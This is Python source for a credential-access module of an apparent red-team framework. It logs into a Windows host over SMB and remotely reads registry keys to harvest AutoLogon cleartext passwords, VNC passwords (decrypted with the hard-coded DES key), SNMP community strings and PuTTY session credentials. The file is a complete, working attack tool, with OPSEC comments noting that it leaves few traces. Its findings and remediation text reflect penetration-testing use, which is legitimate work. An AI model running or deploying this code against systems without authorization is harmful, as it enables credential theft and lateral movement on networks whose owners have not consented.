"""
Windows Registry Credential Enumeration
MITRE: T1552.002 (Credentials in Registry)

Reads well-known registry keys that commonly store credentials in cleartext
or weakly-encoded form. All access is READ-ONLY via impacket remote registry.

Keys checked:
  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
      → DefaultPassword (AutoLogon cleartext password)

  HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\*
      → Hostname, UserName, ProxyUsername, ProxyPassword

  HKCU\\Software\\ORL\\WinVNC3 / TightVNC\\Server / RealVNC\\*
      → Password (DES-encrypted, well-known key, trivial to decode)

  HKLM\\SOFTWARE\\RealVNC\\* / WinVNC4
      → Password

  HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities
      → SNMP community strings (often reused as passwords)

  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*
      → Some installers store credentials in uninstall strings

OPSEC: LOW — remote registry read via SMB named pipe \\pipe\\winreg.
Leaves minimal traces (SMB session + registry access audit events if
Object Access auditing is enabled, which is rare on workstations).
"""
from __future__ import annotations

import asyncio
import base64
import struct
from typing import Any

from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.core.security import sanitize_hostname
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.windows.registry_enum")


def _decode_vnc_password(enc: bytes) -> str:
    """
    VNC stores passwords DES-encrypted with a fixed key (public knowledge).
    This decodes the raw registry bytes back to a 8-char password.
    Key is publicly documented at: https://github.com/frizb/PasswordDecrypts
    """
    try:
        from Crypto.Cipher import DES  # type: ignore[import]
        vnc_key = b"\x17\x52\x6b\x06\x23\x4e\x58\x07"
        # Registry stores as REG_BINARY — pad to 8 bytes
        padded  = (enc + b"\x00" * 8)[:8]
        cipher  = DES.new(vnc_key, DES.MODE_ECB)
        decoded = cipher.decrypt(padded)
        return decoded.rstrip(b"\x00").decode("latin-1")
    except ImportError:
        return f"<encoded: {enc.hex()}> (install pycryptodome to decode)"
    except Exception:
        return f"<decode_error: {enc.hex()}>"


# ── Registry paths to enumerate ────────────────────────────────────────────────
# Each entry: (hive, path, values_or_None_for_all, description, severity)
_ENUM_TARGETS: list[tuple[str, str, list[str] | None, str, str]] = [
    (
        "HKLM",
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        ["DefaultUserName", "DefaultPassword", "DefaultDomainName", "AutoAdminLogon"],
        "AutoLogon credentials",
        "CRITICAL",
    ),
    (
        "HKLM",
        "SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities",
        None,   # enumerate all values
        "SNMP community strings",
        "MEDIUM",
    ),
    (
        "HKLM",
        "SOFTWARE\\RealVNC\\WinVNC4",
        ["Password"],
        "RealVNC stored password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\RealVNC\\vncserver",
        ["Password"],
        "RealVNC server password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\TightVNC\\Server",
        ["Password", "PasswordViewOnly"],
        "TightVNC stored password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\ORL\\WinVNC3",
        ["Password"],
        "WinVNC3 stored password",
        "HIGH",
    ),
    (
        "HKLM",
        "SOFTWARE\\UltraVNC",
        ["passwd", "passwd2"],
        "UltraVNC stored password",
        "HIGH",
    ),
]

# HKCU paths (per-user) — enumerated under current user context
_HKCU_TARGETS: list[tuple[str, str, list[str] | None, str, str]] = [
    (
        "HKCU",
        "Software\\ORL\\WinVNC3",
        ["Password"],
        "WinVNC3 user stored password",
        "HIGH",
    ),
    (
        "HKCU",
        "Software\\TightVNC\\Server",
        ["Password"],
        "TightVNC user password",
        "HIGH",
    ),
]

_SEV_MAP = {
    "CRITICAL": Severity.CRITICAL,
    "HIGH":     Severity.HIGH,
    "MEDIUM":   Severity.MEDIUM,
    "LOW":      Severity.LOW,
}


class RegistryEnumModule(BaseModule):
    """
    windows.registry_enum — Read-only enumeration of well-known registry keys that store credentials — AutoLogon, VNC passwo

    OPSEC: LOW
    MITRE: "T1552.002", "T1082"
    REQUIRES: "local_admin_creds"
    OUTPUTS:  "cleartext_credentials",
        "credential_hints",
    """
    MODULE_ID          = "windows.registry_enum"
    MODULE_NAME        = "Registry Credential Enumeration"
    MODULE_CATEGORY    = "windows"
    MODULE_DESCRIPTION = (
        "Read-only enumeration of well-known registry keys that store "
        "credentials — AutoLogon, VNC passwords, SNMP community strings"
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = ["local_admin_creds"]
    OUTPUTS            = [
        "cleartext_credentials",
        "credential_hints",
    ]
    MITRE_TECHNIQUES   = ["T1552.002", "T1082"]

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                f"{self.MODULE_ID} requires 'target' — IP or hostname.",
                module_id=self.MODULE_ID, field="target",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw={"dry_run": True},
            )
        target   = getattr(ctx, "target", ctx.params.get("target", ""))
        username = ctx.params.get("username", "")
        password = ctx.params.get("password", "") or ctx.params.get("secret", "")
        domain   = getattr(ctx, "domain", "") or ctx.params.get("domain", "")
        findings, raw = await self.run(
            target=target, username=username, password=password, domain=domain,
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("windows.registry_enum")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target   = sanitize_hostname(kwargs.get("target", ""))
        username = kwargs.get("username", "")
        password = kwargs.get("password", "") or kwargs.get("secret", "")
        domain   = kwargs.get("domain", "")
        dry_run  = kwargs.get("dry_run", False)

        if not target or not username:
            return [], {"error": "target and username required"}
        if dry_run:
            return [], {"dry_run": True}

        try:
            from impacket.smbconnection import SMBConnection            # type: ignore[import]
            from impacket.dcerpc.v5 import transport, rrp               # type: ignore[import]
            from impacket.dcerpc.v5.rrp import (                        # type: ignore[import]
                hOpenLocalMachine, hOpenCurrentUser,
                hBaseRegOpenKey, hBaseRegQueryValue,
                hBaseRegQueryInfoKey, hBaseRegEnumValue,
                hBaseRegCloseKey, DCERPCException,
            )
        except ImportError:
            return [], {"error": "impacket not installed — pip install ares-redteam[ad]"}

        logger.info("registry_enum_start", target=target, username=username)
        audit("registry_enum", actor=username, source="operator",
              target=target, technique="T1552.002")

        await self.before_request(target, "smb")

        loop = asyncio.get_running_loop()
        all_findings: list[dict[str, Any]] = []
        putty_sessions: list[dict[str, str]] = []
        errors: list[str] = []

        def _read_registry() -> dict[str, Any]:
            hits: list[dict[str, Any]] = []
            putty: list[dict[str, str]] = []
            errs: list[str] = []

            smb = None
            dce = None
            try:
                smb = SMBConnection(target, target, timeout=15)
                smb.login(username, password, domain)

                string_binding = f"ncacn_np:{target}[\\pipe\\winreg]"
                rpc_transport  = transport.DCERPCTransportFactory(string_binding)
                rpc_transport.set_smb_connection(smb)
                dce = rpc_transport.get_dce_rpc()
                dce.connect()
                dce.bind(rrp.MSRPC_UUID_RRP)

                def _open_hive(hive: str) -> Any:
                    if hive == "HKLM":
                        return hOpenLocalMachine(dce)["phKey"]
                    return hOpenCurrentUser(dce)["phKey"]

                # ── Enumerate fixed targets ────────────────────────────────
                all_targets = _ENUM_TARGETS + _HKCU_TARGETS
                for hive_name, reg_path, val_names, description, sev_str in all_targets:
                    try:
                        hive = _open_hive(hive_name)
                        try:
                            ans  = hBaseRegOpenKey(dce, hive, reg_path)
                            hkey = ans["phkResult"]
                        except DCERPCException:
                            # Key does not exist — normal
                            hBaseRegCloseKey(dce, hive)
                            continue

                        found_vals: dict[str, Any] = {}

                        if val_names is None:
                            # Enumerate all values under key
                            try:
                                info  = hBaseRegQueryInfoKey(dce, hkey)
                                count = info["lpcValues"]
                                for i in range(count):
                                    ev   = hBaseRegEnumValue(dce, hkey, i)
                                    vn   = ev["lpValueNameOut"].rstrip("\x00")
                                    vd   = ev["lpData"]
                                    vt   = ev["lpType"]
                                    if isinstance(vd, bytes):
                                        try:
                                            vd = vd.rstrip(b"\x00").decode("utf-16-le")
                                        except Exception:
                                            vd = vd.hex()
                                    found_vals[vn] = vd
                            except Exception as e:
                                errs.append(f"Enumerate {reg_path}: {e!s:.80}")
                        else:
                            for vn in val_names:
                                try:
                                    ans3 = hBaseRegQueryValue(dce, hkey, vn)
                                    vd   = ans3[1]
                                    if isinstance(vd, bytes) and "VNC" in description:
                                        vd = _decode_vnc_password(vd)
                                    found_vals[vn] = vd
                                except DCERPCException:
                                    pass  # value not present

                        hBaseRegCloseKey(dce, hkey)
                        hBaseRegCloseKey(dce, hive)

                        if found_vals:
                            hits.append({
                                "hive":        hive_name,
                                "path":        reg_path,
                                "values":      found_vals,
                                "description": description,
                                "severity":    sev_str,
                            })

                    except Exception as e:
                        errs.append(f"{hive_name}\\{reg_path}: {e!s:.80}")

                # ── Enumerate PuTTY saved sessions ─────────────────────────
                putty_base = "Software\\SimonTatham\\PuTTY\\Sessions"
                try:
                    hive = _open_hive("HKCU")
                    try:
                        ans   = hBaseRegOpenKey(dce, hive, putty_base)
                        hbase = ans["phkResult"]
                        info  = hBaseRegQueryInfoKey(dce, hbase)
                        count = info["lpcSubKeys"]

                        from impacket.dcerpc.v5.rrp import hBaseRegEnumKey  # type: ignore[import]
                        for i in range(count):
                            try:
                                ek       = hBaseRegEnumKey(dce, hbase, i)
                                sess_name = ek["lpNameOut"].rstrip("\x00")
                                ans2     = hBaseRegOpenKey(dce, hbase, sess_name)
                                hsess    = ans2["phkResult"]

                                sess_data: dict[str, str] = {"session": sess_name}
                                for field in ("HostName", "UserName",
                                              "ProxyUsername", "ProxyPassword"):
                                    try:
                                        av       = hBaseRegQueryValue(dce, hsess, field)
                                        val      = av[1]
                                        if isinstance(val, bytes):
                                            val  = val.rstrip(b"\x00").decode("utf-8",
                                                                               errors="replace")
                                        sess_data[field] = str(val).rstrip("\x00")
                                    except DCERPCException:
                                        pass
                                hBaseRegCloseKey(dce, hsess)

                                # Only report sessions with useful data
                                if any(sess_data.get(k)
                                       for k in ("HostName", "UserName")):
                                    putty.append(sess_data)
                            except Exception:
                                continue

                        hBaseRegCloseKey(dce, hbase)
                    except DCERPCException:
                        pass  # PuTTY not installed
                    hBaseRegCloseKey(dce, hive)
                except Exception as e:
                    errs.append(f"PuTTY sessions: {e!s:.80}")

            except Exception as e:
                errs.append(str(e)[:200])
            finally:
                if dce:
                    try: dce.disconnect()
                    except Exception: pass
                if smb:
                    try: smb.logoff()
                    except Exception: pass

            return {"hits": hits, "putty": putty, "errors": errs}

        result        = await loop.run_in_executor(None, _read_registry)
        all_findings  = result["hits"]
        putty_sessions = result["putty"]
        errors        = result["errors"]

        # ── Generate findings ──────────────────────────────────────────────

        # AutoLogon — most critical
        autologon = next(
            (h for h in all_findings
             if "Winlogon" in h["path"]),
            None,
        )
        if autologon:
            vals    = autologon["values"]
            enabled = str(vals.get("AutoAdminLogon", "0")).strip("\x00") == "1"
            pw      = vals.get("DefaultPassword", "").strip("\x00") if isinstance(
                vals.get("DefaultPassword", ""), str
            ) else ""

            if enabled and pw:
                self.finding(
                    title=f"AutoLogon Cleartext Password Found on {target}",
                    description=(
                        f"AutoLogon is enabled on {target} with DefaultUserName="
                        f"'{vals.get('DefaultUserName','').strip(chr(0))}' "
                        f"and a cleartext password stored in the Winlogon registry key. "
                        "This password can be read by any local administrator."
                    ),
                    severity=Severity.CRITICAL,
                    mitre_technique="T1552.002",
                    mitre_tactic="Credential Access",
                    evidence={
                        "host":    target,
                        "path":    autologon["path"],
                        "user":    vals.get("DefaultUserName", ""),
                        "domain":  vals.get("DefaultDomainName", ""),
                        "password_present": bool(pw),
                    },
                    remediation=(
                        "Disable AutoLogon (set AutoAdminLogon=0 and clear DefaultPassword). "
                        "If AutoLogon is required for kiosk/embedded use, consider "
                        "Windows Autologon via Sysinternals or a dedicated kiosk solution "
                        "that does not store passwords in cleartext registry."
                    ),
                    host=target, confidence=1.0,
                )
            elif enabled:
                self.finding(
                    title=f"AutoLogon Enabled (No Stored Password) on {target}",
                    description=(
                        f"AutoLogon is enabled on {target} for user "
                        f"'{vals.get('DefaultUserName','').strip(chr(0))}' "
                        "but DefaultPassword value is empty. "
                        "This may indicate LSA secret storage instead."
                    ),
                    severity=Severity.MEDIUM,
                    mitre_technique="T1552.002",
                    mitre_tactic="Credential Access",
                    evidence={"host": target, "path": autologon["path"], "values": vals},
                    remediation="Disable AutoLogon unless required for a specific use case.",
                    host=target, confidence=0.85,
                )

        # VNC / SNMP / other credential keys
        for hit in all_findings:
            if "Winlogon" in hit["path"]:
                continue  # already handled above
            sev = _SEV_MAP.get(hit["severity"], Severity.MEDIUM)
            self.finding(
                title=f"{hit['description']} Found on {target}",
                description=(
                    f"Registry key {hit['hive']}\\{hit['path']} on {target} "
                    f"contains stored credentials: {hit['description']}. "
                    "These credentials may be reused across other systems."
                ),
                severity=sev,
                mitre_technique="T1552.002",
                mitre_tactic="Credential Access",
                evidence={
                    "host":   target,
                    "hive":   hit["hive"],
                    "path":   hit["path"],
                    "values": {
                        k: ("<present>" if k.lower() in ("password", "passwd")
                            else v)
                        for k, v in hit["values"].items()
                    },
                },
                remediation=(
                    f"Remove stored credentials from {hit['path']}. "
                    "Use Windows Credential Manager or a vault solution instead of "
                    "storing passwords in the registry."
                ),
                host=target, confidence=0.95,
            )

        # PuTTY sessions
        if putty_sessions:
            self.finding(
                title=(
                    f"PuTTY Saved Sessions Found on {target} "
                    f"({len(putty_sessions)} session(s))"
                ),
                description=(
                    f"{len(putty_sessions)} PuTTY saved session(s) found on {target}. "
                    "Saved sessions may reveal internal hostnames, usernames, "
                    "and occasionally proxy credentials. They indicate SSH-accessible "
                    "systems reachable from this host."
                ),
                severity=Severity.LOW,
                mitre_technique="T1552.002",
                mitre_tactic="Credential Access",
                evidence={
                    "host":     target,
                    "sessions": putty_sessions,
                },
                remediation=(
                    "Audit PuTTY sessions for sensitive hostnames. "
                    "Remove sessions with stored proxy credentials. "
                    "Consider using SSH config files with key-based auth instead."
                ),
                host=target, confidence=0.9,
            )

        raw = {
            "target":          target,
            "credential_hits": all_findings,
            "putty_sessions":  putty_sessions,
            "errors":          errors,
        }
        raw["cleartext_credentials"] = self._findings  # OUTPUTS key
        raw["credential_hints"] = self._findings  # OUTPUTS key
        return self._findings[:], raw
